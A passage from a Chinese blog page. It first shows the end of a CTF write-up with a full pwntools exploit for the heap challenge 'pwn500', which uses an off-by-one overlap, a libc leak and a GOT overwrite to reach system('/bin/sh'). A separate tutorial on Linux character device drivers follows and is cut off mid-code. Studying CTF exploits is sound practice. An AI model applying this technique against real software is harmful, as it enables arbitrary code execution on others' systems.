<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">receiver:</span><br><span class="line">| 0x8  | 0x8  | 0x10   | 0x10     | 0x10    | 0x8     | 0x38</span><br><span class="line">+------+------+--------+----------+---------+---------+-------------+</span><br><span class="line">| next | prev | name   | postcode | contact | pkg_ptr | address     |</span><br><span class="line">+------+------+--------+----------+---------+---------+-------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">VERBOSE = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    r = process(<span class="string">&#x27;./pwn500&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> VERBOSE: context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = <span class="number">0x603038</span></span><br><span class="line">read_offset = <span class="number">0xf69a0</span></span><br><span class="line">system_offset = <span class="number">0x45380</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enterGame</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;send packages(y or n)?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">senderInfo</span>(<span class="params">name, contact</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your contact?\n&#x27;</span>)</span><br><span class="line">    r.send(contact)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submitPack</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showRecv</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteRecv</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index of receiver that you want to delete?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newRecv</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setRecv</span>(<span class="params">name, postcodes, contact, address</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your postcodes?\n&#x27;</span>)</span><br><span class="line">    r.send(postcodes)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your contact?\n&#x27;</span>)</span><br><span class="line">    r.send(contact)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your address?\n&#x27;</span>)</span><br><span class="line">    r.send(address)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newPackage</span>(<span class="params">length, data</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;length of your package?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;input your package~\n&#x27;</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">savePackage</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exitAddRecv</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletePackage</span>(<span class="params">index</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index of package that you want to delete?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editRecv</span>(<span class="params">index, name, postcodes, contact, address</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your choice :&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;index of receiver that you want to edit?\n&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">    r.send(name)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your postcodes?\n&#x27;</span>)</span><br><span class="line">    r.send(postcodes)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your contact?\n&#x27;</span>)</span><br><span class="line">    r.send(contact)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;your address?\n&#x27;</span>)</span><br><span class="line">    r.send(address)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    <span class="keyword">if</span> DEBUG: gdb.attach(r)</span><br><span class="line">    enterGame()</span><br><span class="line"></span><br><span class="line">    senderInfo(<span class="string">&#x27;1\n&#x27;</span>, <span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    newRecv() <span class="comment"># enter Packages Log</span></span><br><span class="line">    setRecv(<span class="string">&#x27;1\n&#x27;</span>, <span class="string">&#x27;1\n&#x27;</span>, <span class="string">&#x27;1\n&#x27;</span>, <span class="string">&#x27;1\n&#x27;</span>)</span><br><span class="line">    newPackage(<span class="number">160</span>, <span class="string">&#x27;a&#x27;</span>.ljust(<span class="number">159</span>, <span class="string">&#x27;a&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>) <span class="comment"># hex(160 + 24) = 0xb8(receiver的大小) 所以申请160的大小</span></span><br><span class="line">    newPackage(<span class="number">160</span>, <span class="string">&#x27;b&#x27;</span>.ljust(<span class="number">159</span>, <span class="string">&#x27;b&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    newPackage(<span class="number">160</span>, <span class="string">&#x27;c&#x27;</span>.ljust(<span class="number">159</span>, <span class="string">&#x27;c&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    newPackage(<span class="number">8</span>, <span class="string">&#x27;pad\n&#x27;</span>)</span><br><span class="line">    newPackage(<span class="number">160</span>, <span class="string">&#x27;d&#x27;</span>.ljust(<span class="number">159</span>, <span class="string">&#x27;d&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    newPackage(<span class="number">224</span>, <span class="string">&#x27;e&#x27;</span>.ljust(<span class="number">223</span>, <span class="string">&#x27;e&#x27;</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># 堆   a b c pad d e</span></span><br><span class="line">    <span class="comment"># 链表 pad-&gt;d-&gt;c-&gt;b-&gt;a-&gt;e</span></span><br><span class="line">    deletePackage(<span class="number">2</span>) <span class="comment"># 删除c</span></span><br><span class="line">    deletePackage(<span class="number">1</span>) <span class="comment"># 删除d</span></span><br><span class="line">    <span class="comment"># 堆   a b 空 pad 空 e</span></span><br><span class="line">    <span class="comment"># 链表 pad-&gt;b-&gt;a-&gt;e</span></span><br><span class="line">    savePackage()</span><br><span class="line"></span><br><span class="line">    newRecv()</span><br><span class="line">    setRecv(<span class="string">&#x27;2\n&#x27;</span>, <span class="string">&#x27;2\n&#x27;</span>, <span class="string">&#x27;2\n&#x27;</span>, <span class="string">&#x27;/bin/sh;\n&#x27;</span>) <span class="comment"># 原先c的位置</span></span><br><span class="line">    newPackage(<span class="number">160</span>, <span class="string">&#x27;x&#x27;</span>*<span class="number">152</span> + p64(<span class="number">816</span>)) <span class="comment"># 原先d的位置, off by one，把e的prev_inuse位覆盖为0</span></span><br><span class="line">    <span class="comment"># 堆   a b 2 pad x e</span></span><br><span class="line">    <span class="comment"># 链表 pad-&gt;x-&gt;b-&gt;a-&gt;e</span></span><br><span class="line">    deletePackage(<span class="number">3</span>) <span class="comment"># 删除a</span></span><br><span class="line">    deletePackage(<span class="number">3</span>) <span class="comment"># 删除e，prev_size是816，会把到a的堆当做空闲chunk</span></span><br><span class="line">    <span class="comment"># 堆   空 b 2 pad x 空 ; 实际都为空</span></span><br><span class="line">    <span class="comment"># 链表 pad-&gt;x-&gt;b</span></span><br><span class="line">    savePackage()</span><br><span class="line">    </span><br><span class="line">    newRecv()</span><br><span class="line">    setRecv(<span class="string">&#x27;3\n&#x27;</span>, <span class="string">&#x27;3\n&#x27;</span>, <span class="string">&#x27;3\n&#x27;</span>, <span class="string">&#x27;3\n&#x27;</span>) <span class="comment"># 原先a的位置，有必要，没有receiver不能new package</span></span><br><span class="line">    <span class="comment"># 168+8+8 原先b的位置，将c位置上的receiver0的next指针覆盖为read@got-0x48，show_reveiver时next-&gt;address会打印出read的地址</span></span><br><span class="line">    newPackage(<span class="number">0xb9</span>, <span class="string">&#x27;A&#x27;</span> * <span class="number">168</span> + p64(read_got - <span class="number">0x48</span>) + p64(<span class="number">0x0</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exitAddRecv()</span><br><span class="line"></span><br><span class="line">    showRecv()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2</span>):    r.recvuntil(<span class="string">&#x27;address:&#x27;</span>)</span><br><span class="line">    addr = u64(r.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - read_offset</span><br><span class="line">    info(<span class="string">&quot;Libc leak = &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">    system = addr + system_offset</span><br><span class="line">    read = addr + read_offset</span><br><span class="line"></span><br><span class="line">    editRecv(<span class="number">1</span>, <span class="string">&#x27;1\n&#x27;</span>, <span class="string">&#x27;1\n&#x27;</span>, p64(system)[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span>, p64(read)[:<span class="number">-1</span>] + <span class="string">&#x27;\n&#x27;</span>) <span class="comment"># 把strcpy@got覆盖为system的地址</span></span><br><span class="line">    editRecv(<span class="number">0</span>, <span class="string">&#x27;x\n&#x27;</span>, <span class="string">&#x27;x\n&#x27;</span>, <span class="string">&#x27;x\n&#x27;</span>, <span class="string">&#x27;x\n&#x27;</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/10/21/Linux%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8/" class="post-title-link" itemprop="url">Linux设备驱动（二）字符设备驱动</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-10-21 14:39:19" itemprop="dateCreated datePublished" datetime="2016-10-21T14:39:19+08:00">2016-10-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="字符设备驱动结构"><a href="#字符设备驱动结构" class="headerlink" title="字符设备驱动结构"></a>字符设备驱动结构</h2><h3 id="cdev结构体"><a href="#cdev结构体" class="headerlink" title="cdev结构体"></a>cdev结构体</h3><p>Linux内核中cdev结构体描述一个字符设备。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>         <span class="comment">// 内嵌的kobject对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>        <span class="comment">// 所属模块</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span> <span class="comment">// 文件操作结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">dev_t</span> dev;                   <span class="comment">// 设备号</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>dev_t</code>定义了设备号，为32位，其中12位为主设备号，20位为次设备号。下面的宏可以获得主设备号和次设备号：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAJOR(<span class="keyword">dev_t</span> dev)</span><br><span class="line">MINOR(<span class="keyword">dev_t</span> dev)</span><br></pre></td></tr></table></figure>
<p>使用下面的宏可以用主设备号和次设备号生成dev_t：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MKDEV(<span class="keyword">int</span> major, <span class="keyword">int</span> minor)</span><br></pre></td></tr></table></figure>
<p>Linux内核提供了一组函数用于操作cdev结构体：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_init</span><span class="params">(struct cdev *, struct file_operations *)</span></span>; <span class="comment">// 用于初始化cdev的成员，并建立cdev和file_operations之间的连接</span></span><br><span class="line"><span class="function">struct cdev *<span class="title">cdev_alloc</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 用于动态申请一个cdev内存</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_put</span><span class="params">(struct cdev *p)</span></span>;</span><br><span class="line"><span class="comment">// 用向系统添加和删除一个cdev，完成字符设备的注册和注销</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cdev_add</span><span class="params">(struct cdev *, <span class="keyword">dev_t</span>, <span class="keyword">unsigned</span>)</span></span>; <span class="comment">// 通常在字符设备驱动模块加载函数中调用</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cdev_del</span><span class="params">(struct cdev *)</span></span>; <span class="comment">// 字符设备驱动模块卸载函数中调用</span></span><br></pre></td></tr></table></figure>

<h3 id="分配和释放设备号"><a href="#分配和释放设备号" class="headerlink" title="分配和释放设备号"></a>分配和释放设备号</h3><p>在调用cdev_add()函数向系统注册字符设备之前，应首先调用<code>register_chrdev_region()</code>或<code>alloc_chrdev_region()</code>函数向系统申请设备号：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> from, <span class="keyword">unsigned</span> count, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_chrdev_region</span><span class="params">(<span class="keyword">dev_t</span> *dev, <span class="keyword">unsigned</span> baseminor, <span class="keyword">unsigned</span> count, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure>
<p>register_chrdev_region()函数用于已知起始设备的设备号的情况，而alloc_chrdev_region()用于设备号未知，向系统动态申请未被占用的设备号的情况。</p>
<h3 id="file-operations结构体"><a href="#file-operations结构体" class="headerlink" title="file_operations结构体"></a>file_operations结构体</h3><p>file_operations结构体中的成员函数是字符设备驱动程序设计的主体内容，这些函数实际会在应用程序进行Linux的open()、write()、read()、close()等系统调用时最终被内核调用。<br><strong>代码清单</strong> include/linux/fs.h: file_operations  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="keyword">int</span> (*readdir) (struct file *, <span class="keyword">void</span> *, <span class="keyword">filldir_t</span>);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">int</span> <span class="params">(*poll)</span> <span class="params">(struct file *, struct poll_table_struct *)</span></span>;</span><br><span class="line">    <span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">int</span> (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line">    <span class="keyword">int</span> (*open) (struct inode *, struct file *);</span><br><span class="line">    <span class="keyword">int</span> (*flush) (struct file *, <span class="keyword">fl_owner_t</span> id);</span><br><span class="line">    <span class="keyword">int</span> (*release) (struct inode *, struct file *);</span><br><span class="line">    <span class="keyword">int</span> (*fsync) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">loff_t</span>, <span class="keyword">int</span> datasync);</span><br><span class="line">    <span class="keyword">int</span> (*aio_fsync) (struct kiocb *, <span class="keyword">int</span> datasync);</span><br><span class="line">    <span class="keyword">int</span> (*fasync) (<span class="keyword">int</span>, struct file *, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> (*lock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*sendpage) (struct file *, struct page *, <span class="keyword">int</span>, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *, <span class="keyword">int</span>);</span><br><span class="line">    <span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(struct file *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>)</span></span>;</span><br><span class="line">    <span class="keyword">int</span> (*check_flags)(<span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> (*flock) (struct file *, <span class="keyword">int</span>, struct file_lock *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*splice_write)(struct pipe_inode_info *, struct file *, <span class="keyword">loff_t</span> *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*splice_read)(struct file *, <span class="keyword">loff_t</span> *, struct pipe_inode_info *, <span class="keyword">size_t</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> (*setlease)(struct file *, <span class="keyword">long</span>, struct file_lock **);</span><br><span class="line">    <span class="keyword">long</span> (*fallocate)(struct file *file, <span class="keyword">int</span> mode, <span class="keyword">loff_t</span> offset,</span><br><span class="line">              <span class="keyword">loff_t</span> len);</span><br><span class="line">    <span class="keyword">int</span> (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>下面对file_operations结构体中的主要成员简要介绍：<br><code>llseek()</code>函数用来修改一个文件的当前读写位置，并将新位置返回，在出错时，这个函数返回一个负值。<br><code>read()</code>函数用来从设备中读取数据，成功时函数返回读取的字节数，出错时返回一个负值。<br><code>write()</code>函数向设备发送数据，成功时该函数返回写入的字节数。如果次函数未被实现，当用户进行write()系统调用时，将得到-EINVAL返回值。<br><code>unlocked_ioctl()</code>提供设备相关控制命令的实现，当调用成功时，返回给调用程序一个非负值。</p>
<h3 id="字符设备驱动的组成"><a href="#字符设备驱动的组成" class="headerlink" title="字符设备驱动的组成"></a>字符设备驱动的组成</h3><p><strong>1.字符设备驱动模块加载与卸载函数</strong><br><strong>代码清单</strong> 加载与卸载函数模板  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设备结构体</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xxx_dev_t</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125; xxx_dev;</span><br><span class="line"><span class="comment">// 设备驱动模块加载函数</span></span><br><span 